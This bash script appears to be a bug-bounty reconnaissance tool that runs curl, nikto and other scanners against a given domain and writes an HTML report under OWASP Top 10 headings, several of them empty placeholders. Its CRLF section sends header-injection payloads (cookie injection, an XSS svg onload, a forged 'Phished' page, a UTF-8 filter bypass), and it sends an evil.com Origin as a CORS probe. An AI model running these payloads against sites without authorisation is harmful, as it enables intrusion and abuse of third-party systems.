#!/bin/bash
if [ ! -d "$1_web" ]; then
mkdir $1_web
else
echo "\e[32m Overwriting results for $1 \e[0m"
fi
echo $1 > $1_web/searchedfor.txt
echo "\e[32m Analyzing "$1" and generating html report\e[0m"
echo "<html>" > $1_web/$1_web.html
echo "<head>" >> $1_web/$1_web.html
echo "<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Mina' rel='stylesheet'>" >> $1_web/$1_web.html
echo "</head>">> $1_web/$1_web.html
echo "<body><meta charset='utf-8'> <meta name='viewport' content='width=device-width, initial-scale=1'> <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css'> <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script> <script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js'></script></body>">> $1_web/$1_web.html
echo "<div class='jumbotron text-center'><h1> Domain analyzed: "$1" </h1>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center'><h1> Owasp Top 10</h1>" >> $1_web/$1_web.html
echo "\e[32m Building OWASP TOP 10 table \e[0m"
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>OWASP TOP 10</h2></div>" >> $1_web/$1_web.html
echo "<pre style='display: block;'class='jumbotron text-left'>" >> $1_web/$1_web.html
echo "<h2><b>Injection</b></h2>" >> $1_web/$1_web.html
echo "<h3>Any sensitive input or any injection entrypoint such as SQL, NoSQL, OS, and LDAP injection, occur \n when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data \n can trick the interpreter into executing unintended commands or accessing data without proper authorization</h3>" >> $1_web/$1_web.html
echo "<h2><b>Broken Authentication</b></h2>" >> $1_web/$1_web.html
echo "<h3>Application functions related to authentication and session management are often implemented incorrectly, \n allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws \n to assume other users’ identities temporarily or permanently. </h3>" >> $1_web/$1_web.html
echo "<h2><b>Sensitive Data Exposure</b></h2>" >> $1_web/$1_web.html
echo "<h3>Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. \n Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. \n Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser</h3>" >> $1_web/$1_web.html
echo "<h2><b>XML External Entities</b></h2>" >> $1_web/$1_web.html
echo "<h3>Many older or poorly configured XML processors evaluate external entity references within XML documents. \n External entities can be used to disclose internal files using the file URI handler, \n internal file shares, internal port scanning, remote code execution, and denial of service attacks. </h3>" >> $1_web/$1_web.html
echo "<h2><b>Broken Access Control</b></h2>" >> $1_web/$1_web.html
echo "<h3>Restrictions on what authenticated users are allowed to do are often not properly enforced. \n Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users' accounts, \n view sensitive files, modify other users’ data, change access rights, etc. </h3>" >> $1_web/$1_web.html
echo "<h2><b>Security Misconfigurations</b></h2>" >> $1_web/$1_web.html
echo "<h3>Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure \n default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing \n sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, \n but they must be patched and upgraded in a timely fashion. </h3>" >> $1_web/$1_web.html
echo "<h2><b>XSS</b></h2>" >> $1_web/$1_web.html
echo "<h3>XSS flaws occur whenever an application includes untrusted data in a new web page without \n proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create \n HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, \n or redirect the user to malicious sites.</h3>" >> $1_web/$1_web.html
echo "<h2><b>Insecure Deserialization</b></h2>" >> $1_web/$1_web.html
echo "<h3>Insecure deserialization often leads to remote code execution. Even if deserialization \n flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, \n injection attacks, and privilege escalation attacks.</h3>" >> $1_web/$1_web.html
echo "<h2><b>Components with known Vulnerabilities</b></h2>" >> $1_web/$1_web.html
echo "<h3>Components, such as libraries, frameworks, and other software modules, run with the \n same privileges as the application. If a vulnerable component is exploited, such an attack can \n facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities \n may undermine application defenses and enable various attacks and impacts. </h3>" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>General Response Header from $1</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
curl -i https://$1 >> $1_web/$1_generalresponse.txt
cat  $1_web/$1_generalresponse.txt >> $1_web/$1_web.html
echo "identified server" >> $1_web/$1_web.html
grep -i "server" $1_web/$1_generalresponse.txt >> $1_web/$1_web.html
grep -i "powered-by" $1_web/$1_generalresponse.txt >> $1_web/$1_web.html 
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>Nikto analysis</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
nikto -h https://$1 >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>Injection</h2></div>" >> $1_web/$1_web.html
echo "<pre style='display: block;'class='jumbotron text-left'>" >> $1_web/$1_web.html
echo "Inputs available on the service" >> $1_web/$1_web.html
inputfinder -urls=https://$1 >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>Broken Authentication</h2></div>" >> $1_web/$1_web.html
echo "<pre style='display: block;'class='jumbotron text-left'>" >> $1_web/$1_web.html
echo "Analyzis" >> $1_web/$1_web.html;
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>Sensitive Data Exposure</h2></div>" >> $1_web/$1_web.html
echo "<pre style='display: block;'class='jumbotron text-left'>" >> $1_web/$1_web.html
echo "Analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div class='jumbotron text-center',style='font-family:'Mina', serif'><h2>XML External Entities</h2></div>" >> $1_web/$1_web.html
echo "<pre style='display: block;'class='jumbotron text-left'>" >> $1_web/$1_web.html
echo "Analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Broken Access Control</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "analyzis" >> $1_web/$1_web.html;
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Security Misconfigurations</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>XSS</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Insecure Deserialization</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Components with known vulnerabilities</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Other</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "analyzis" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Carriage Return and Line Feed</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "Trying to add cookie" >> $1_web/$1_web.html
curl -i https://$1/%0D%0ASet-Cookie:mycookie=myvalue >> $1_web/$1_web.html
echo "cookie with XSS bypass" >> $1_web/$1_web.html
curl -i "https://$1/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e" >> $1_web/$1_web.html
echo "only writting html like example.com/<payload>"  >> $1_web/$1_web.html
curl -i "https://$1/%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E" >> $1_web/$1_web.html
echo "crlf filter bypass using utf-8 encoding" >> $1_web/$1_web.html
curl -i "https://$1/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE" >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
sleep 20;
echo "<div style='font-family: 'Mina', serif;'><h2>Cors Violation --> Cross Origin Resource Sharing</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "Adding Origin as evil.com. Check Access-Control-Allow-Origin header" >> $1_web/$1_web.html
curl -i https://$1 -H "Origin:evil.com" >> $1_web/$1_web.html
echo "<h3>using corstest script</h3>" >> $1_web/$1_web.html
python ~/tools/corstest/corstest.py ~/tools/$1/$1_waybackurls.txt >> ~/tools/$1_web/$1_corstest.txt
grep -i "not vulnerable" ~/tools/$1_web/$1_corstest.txt >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>SPF - Sender Policy Framework</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "Using my script mxgoogle.py" >> $1_web/$1_web.html
python3 ~/tools/SCRIPTS/mxgoogle.py $1 >> $1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "<div style='font-family: 'Mina', serif;'><h2>Possible Parameters from wayback, threat exchange, etc</h2></div>" >> $1_web/$1_web.html
echo "<pre>" >> $1_web/$1_web.html
echo "<h3>geturls from hakluke</h3>" >> $1_web/$1_web.html
geturls https://$1 >> $1_web/$1_geturls.txt
grep "=" ~/tools/$1_web/$1_geturls.txt >> ~/tools/$1_web/$1_web.html
grep "?" ~/tools/$1_web/$1_geturls.txt >> ~/tools/$1_web/$1_web.html
echo "<h3>data parameters from wayback</h3>" >> $1_web/$1_web.html 
grep "=" ~/tools/$1/$1_waybackurls.txt >> ~/tools/$1_web/$1_web.html
grep "?" ~/tools/$1/$1_waybackurls.txt >> ~/tools/$1_web/$1_web.html
echo "</pre>" >> $1_web/$1_web.html
echo "</body>" >> $1_web/$1_web.html
echo "</html>" >> $1_web/$1_web.html
echo "\e[32m Finalizing report for "$1"\e[0m"
echo "\e[32m Report done \e[0m"

